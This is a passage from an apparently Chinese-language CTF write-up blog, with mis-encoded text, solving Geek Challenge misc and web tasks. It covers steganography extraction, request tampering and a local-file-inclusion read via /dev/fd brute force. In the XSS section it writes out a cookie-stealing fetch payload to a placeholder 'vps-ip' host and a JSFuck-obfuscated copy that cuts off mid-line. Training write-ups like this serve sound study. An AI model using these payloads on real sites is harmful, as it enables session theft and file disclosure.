class="string">&quot;parent&quot;</span>]</span><br><span class="line">    <span class="keyword">if</span> parent_id <span class="keyword">in</span> nodes:</span><br><span class="line">        nodes[parent_id][<span class="string">&quot;children&quot;</span>].append(node_id)</span><br><span class="line"></span><br><span class="line"><span class="comment"># é€’å½’è·å–æ–‡æœ¬</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_text</span>(<span class="params">node_id</span>):</span><br><span class="line">    <span class="keyword">if</span> node_id <span class="keyword">in</span> deleted:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    node = nodes[node_id]</span><br><span class="line">    result = node[<span class="string">&quot;ch&quot;</span>]</span><br><span class="line">    <span class="comment"># æŒ‰ ctr æˆ–è€…æ’å…¥é¡ºåºæ’åˆ— children å¯ä»¥æé«˜ç¨³å®šæ€§</span></span><br><span class="line">    <span class="keyword">for</span> child_id <span class="keyword">in</span> node[<span class="string">&quot;children&quot;</span>]:</span><br><span class="line">        result += build_text(child_id)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ‰¾åˆ°æ ¹èŠ‚ç‚¹ï¼ˆparent=HEADï¼‰</span></span><br><span class="line">roots = [nid <span class="keyword">for</span> nid, n <span class="keyword">in</span> nodes.items() <span class="keyword">if</span> n[<span class="string">&quot;parent&quot;</span>] == <span class="string">&quot;HEAD&quot;</span>]</span><br><span class="line"></span><br><span class="line">final_text = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> root <span class="keyword">in</span> roots:</span><br><span class="line">    final_text += build_text(root)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(final_text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># SYC&#123;CRDT_RGA_CHALLENGE_IS_SO_EASY&#125;</span></span><br></pre></td></tr></table></figure><p>â€‹</p><h3 id="gift"><a href="#gift" class="headerlink" title="gift"></a>gift</h3><blockquote><p>ä»–è¸ä¸Šäº†ç“·ç –ä¸Šå¾ˆæ»‘ä»–å«æˆ‘åˆ«å¾€å‰èµ°æˆ‘æ²¡å¬æ¸…ä¸€è„šè¸ä¸Šå»æˆ‘ä¿©è·Ÿç©èŠ±æ»‘ä¼¼çš„ ä¸ç»æ„é—´æŠ¬å¤´çš„æ—¶å€™å‘ç°ä¼å…¨åœ¨æˆ‘è¿™è¾¹æŠŠæˆ‘ç½©çš„ä¸¥ä¸¥å®å®çš„ä»–å¼¯è…°æŠŠæˆ‘ç¯ä½åŠè¾¹è¢–å­éƒ½æ˜¯é›ªèŠ± åœ¨è¡—è¾¹è·¯å£ä¹°äº†ä¸€ç›’è¯æ¢…ä»–å–‚äº†ä¿©é¢—è¿›æˆ‘å˜´é‡Œ é‚£ä¸€åˆ»çš„æ„Ÿè§‰å°±æ˜¯â€œæˆ‘ä»¬ä¸è°ˆæ‹çˆ±ï¼Œæˆ‘ä»¬ç§å¥”â€</p></blockquote><p>zipæœ«å°¾ï¼š<code>ZzFmdA==</code></p><p>base64è§£ç å¾—ï¼š<code>g1ft</code></p><p>è§£å‹ï¼Œå¾—åˆ°watermark.BMPï¼Œç›²æ°´å°æå–flagï¼š</p><p><code>SYC&#123;IT3_gift-f0r-you&#125;</code></p><p>â€‹</p><h3 id="4ak5ra"><a href="#4ak5ra" class="headerlink" title="4ak5ra"></a>4ak5ra</h3><blockquote><p>flagä¸­é—´æ²¡ç©ºæ ¼<br>sakuraå› ä¸ºå–œæ¬¢è—ä¸œè¥¿æ‰€ä»¥è¢«éª‚äº†ä¸€é¡¿ã€‚åé¢æˆ‘è¿‡å»çš„æ—¶å€™ä»–è¹²åœ¨åœ°ä¸Šç”»åœˆåœˆï¼Œæˆ‘ä¸Šå‰çœ‹åˆ°ä»–åœ¨åœˆé‡Œå†™äº†ä¸‰ä¸ªç¥ç§˜å­—æ¯ï¼šLSB</p></blockquote><p>jpgæœ«å°¾æœ‰zipï¼Œæå–å‡ºpngï¼š</p><p><code>zsteg -a 4akra.png</code></p><p>å¾—åˆ°ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b1,rgb,lsb,xy       .. text: &quot;5SYC&#123;Im_waiting_for_Sakura_t0_become_a_top_pwn_master&#125;$&quot;</span><br></pre></td></tr></table></figure><p><code>SYC&#123;Im_waiting_for_Sakura_t0_become_a_top_pwn_master&#125;</code></p><p>â€‹</p><h3 id="é—®å·"><a href="#é—®å·" class="headerlink" title="é—®å·"></a>é—®å·</h3><blockquote><p><a target="_blank" rel="noopener" href="https://wj.qq.com/s2/24940840/acfb/">https://wj.qq.com/s2/24940840/acfb/</a></p></blockquote><p>ç­”é—®å·ã€‚</p><p>â€‹</p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="é˜¿åŸºé‡Œæ–¯è¿½ä¹Œé¾Ÿ"><a href="#é˜¿åŸºé‡Œæ–¯è¿½ä¹Œé¾Ÿ" class="headerlink" title="é˜¿åŸºé‡Œæ–¯è¿½ä¹Œé¾Ÿ"></a>é˜¿åŸºé‡Œæ–¯è¿½ä¹Œé¾Ÿ</h3><blockquote><p>åœ¨å¤å¸Œè…Šï¼Œè‹±é›„é˜¿åŸºé‡Œæ–¯å’Œä¸€åªä¹Œé¾Ÿèµ›è·‘ã€‚é˜¿åŸºé‡Œæ–¯çš„é€Ÿåº¦æ˜¯ä¹Œé¾Ÿçš„åå€ã€‚æ¯”èµ›å¼€å§‹æ—¶ï¼Œä¹Œé¾Ÿåœ¨é˜¿åŸºé‡Œæ–¯å‰é¢100ç±³ã€‚èŠè¯ºæ‚–è®ºè®¤ä¸ºï¼Œå½“é˜¿åŸºé‡Œæ–¯è¿½åˆ°ä¹Œé¾Ÿçš„å‡ºå‘ç‚¹æ—¶ï¼Œä¹Œé¾Ÿå·²ç»åˆå‘å‰çˆ¬äº†ä¸€æ®µè·ç¦»ã€‚å½“é˜¿åŸºé‡Œæ–¯å†è¿½åˆ°é‚£ä¸ªä½ç½®æ—¶ï¼Œä¹Œé¾Ÿåˆå‘å‰çˆ¬äº†ã€‚å¦‚æ­¤æ— é™å¾ªç¯ï¼Œé˜¿åŸºé‡Œæ–¯ä¼¼ä¹æ°¸è¿œä¹Ÿè¿½ä¸ä¸Šä¹Œé¾Ÿã€‚ä»–çœŸçš„è¿½ä¸ä¸Šå—ï¼Ÿ</p></blockquote><p>bpæŠ“åŒ…ï¼Œè§£æjsonä¸­çš„base64ï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/chase</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>019a1659-d28e-7d93-b878-568dfb7803fe.geek.ctfplus.cn</span><br><span class="line"></span><br><span class="line"><span class="language-json"><span class="punctuation">&#123;</span><span class="attr">&quot;data&quot;</span><span class="punctuation">:</span><span class="string">&quot;eyJhY2hpbGxlc19kaXN0YW5jZSI6MTAwMDAwMDAwMDAsInRvcnRvaXNlX2Rpc3RhbmNlIjoxMTAwMDAwMDAwMH0=&quot;</span><span class="punctuation">&#125;</span></span></span><br></pre></td></tr></table></figure><p>è§£ç ï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;achilles_distance&quot;</span><span class="punctuation">:</span><span class="number">10000000000</span><span class="punctuation">,</span><span class="attr">&quot;tortoise_distance&quot;</span><span class="punctuation">:</span><span class="number">11000000000</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>ä¿®æ”¹ä¸ºï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;achilles_distance&quot;</span><span class="punctuation">:</span><span class="number">10000000000</span><span class="punctuation">,</span><span class="attr">&quot;tortoise_distance&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>ä¿®æ”¹httpè¯·æ±‚ï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/chase</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>019a1659-d28e-7d93-b878-568dfb7803fe.geek.ctfplus.cn</span><br><span class="line"></span><br><span class="line"><span class="language-json"><span class="punctuation">&#123;</span><span class="attr">&quot;data&quot;</span><span class="punctuation">:</span><span class="string">&quot;eyJhY2hpbGxlc19kaXN0YW5jZSI6MTAwMDAwMDAwMDAsInRvcnRvaXNlX2Rpc3RhbmNlIjoxfQ==&quot;</span><span class="punctuation">&#125;</span></span></span><br></pre></td></tr></table></figure><p>å¾—åˆ°ï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;data&quot;</span><span class="punctuation">:</span><span class="string">&quot;eyJmbGFnIjogIlNZQ3tTcGkxdF90aDNfVDFtZV90MF90aGVfM25kXzAxOWExNjU5ZDI3MDc1ZTdhNjkzNzI5MTNjNzgxMDg3fSJ9&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>è§£ç å¾—flagï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;flag&quot;</span><span class="punctuation">:</span> <span class="string">&quot;SYC&#123;Spi1t_th3_T1me_t0_the_3nd_019a1659d27075e7a69372913c781087&#125;&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>â€‹</p><h3 id="Vibe-SEO"><a href="#Vibe-SEO" class="headerlink" title="Vibe SEO"></a>Vibe SEO</h3><blockquote><p>â€œæˆ‘è®© AI å¸®æˆ‘åšäº†æœç´¢å¼•æ“ä¼˜åŒ–ï¼Œå®ƒå¥½åƒè¯´ä»€ä¹ˆã€æœç´¢å¼•æ“å–œæ¬¢ç»“æ„åŒ–çš„ç«™ç‚¹åœ°å›¾ã€ï¼Œè™½ç„¶ä¸æ˜¯å¾ˆæ‡‚å°±æ˜¯äº†â€</p></blockquote><p>æ ¹æ®æç¤ºçš„â€œç»“æ„åŒ–çš„ç«™ç‚¹åœ°å›¾â€ï¼Œè®¿é—®ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/sitemap.xml</span><br></pre></td></tr></table></figure><p>å¾—åˆ°ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">This XML file does not appear to have any style information associated with it. The document tree is shown below.</span><br><span class="line"><span class="tag">&lt;<span class="name">urlset</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.sitemaps.org/schemas/sitemap/0.9&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">url</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">loc</span>&gt;</span>http://localhost/<span class="tag">&lt;/<span class="name">loc</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">changefreq</span>&gt;</span>weekly<span class="tag">&lt;/<span class="name">changefreq</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">url</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">loc</span>&gt;</span>http://localhost/aa__^^.php<span class="tag">&lt;/<span class="name">loc</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">changefreq</span>&gt;</span>never<span class="tag">&lt;/<span class="name">changefreq</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">urlset</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å†è®¿é—®ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/aa__%5E%5E.php</span><br></pre></td></tr></table></figure><p>æ ¹æ®æŠ¥é”™ï¼Œå­˜åœ¨æ–‡ä»¶åŒ…å«ï¼Œè®¿é—®ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/aa__%5E%5E.php?filename=aa__%5E%5E.php</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹aa__^^.phpçš„æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$flag</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;/my_secret.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]) &lt; <span class="number">11</span>) &#123;</span><br><span class="line">  <span class="title function_ invoke__">readfile</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;Filename too long&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ— flagè¾“å‡ºï¼Œä½†æ‰“å¼€äº†/my_secret.txtã€‚</p><p>é€šå¸¸ï¼Œå½“ fopen æ‰“å¼€æ–‡ä»¶æ—¶ï¼Œå®ƒä¼šä½¿ç”¨æœ€å°çš„æœªä½¿ç”¨æ–‡ä»¶æè¿°ç¬¦ã€‚åœ¨ä»£ç ä¸­ï¼Œ fopen åæ²¡æœ‰å…³é—­ï¼Œæ‰€ä»¥æ–‡ä»¶æè¿°ç¬¦ä¿æŒæ‰“å¼€ã€‚</p><p>/proc/self/fd/ å¯èƒ½æœ‰ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦æŒ‡å‘ /my_secret.txtï¼Œä½†ä¸çŸ¥é“idã€‚</p><p>ç”±äºæœ‰é•¿åº¦11çš„é™åˆ¶ï¼Œå¯ä»¥ä½¿ç”¨ /dev/fd/ ä»£æ›¿ /proc/self/fd/ï¼Œç„¶åçˆ†ç ´fdåçš„æ•°å€¼ã€‚</p><p>bpæŠ“åŒ…çˆ†ç ´ /dev/fd/xï¼Œåœ¨ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/aa__%5E%5E.php?filename=/dev/fd/13</span><br></pre></td></tr></table></figure><p>å¾—åˆ°flagï¼š</p><p><code>SYC&#123;019a1776ba8f77988073dbc6d85a49fc&#125;</code></p><p>â€‹</p><h3 id="Xross-The-Finish-Line"><a href="#Xross-The-Finish-Line" class="headerlink" title="Xross The Finish Line"></a>Xross The Finish Line</h3><blockquote><p>è¡¨é¢é˜²æŠ¤</p></blockquote><p>ä¸€ä¸ªå…¸å‹çš„XSSé¢˜ï¼Œfuzzå‘ç°è¿‡æ»¤äº†ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">script img svg ç©ºæ ¼ error &#x27; &quot;</span><br></pre></td></tr></table></figure><p>ç©ºæ ¼ç”¨/ç»•è¿‡ï¼Œå°è¯•æ„é€ ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;textarea/autofocus/onfocus=fetch(&#x27;http://vps-ip:port/?c=&#x27;+document.cookie)&gt;</span><br></pre></td></tr></table></figure><p>ç”±äºä¸èƒ½ç”¨å¼•å·ï¼Œå­—ç¬¦ä¸²éƒ¨åˆ†ç”¨jsfuckç»•ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;textarea/autofocus/onfocus=fetch((+(+!+[]+[+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[+[]]+(!![]+[])[+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(![]+[+[]])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+!+[]+[+[]]]+![]+(![]+[+[]])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+!+[]+[+[]]])()[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]()+[])[!+[]+!+[]+!+[]]+(![]+[+[]])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+!+[]+[+[]]]+(![]+[+[]])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+!+[]+[+[]]]+[+!+[]]+[!+[]+!+[]]+[+[]]+(+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+[!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+(+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+[+!+[]]+[+[]]+[!+[]+!+[]+!+[]+!+[]]+(+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+[!+[]+!+[]]+[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(![]+[+[]])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+!+[]+[+[]]]+![]+(![]+[+[]])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+!+[]+[+[]]])()[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(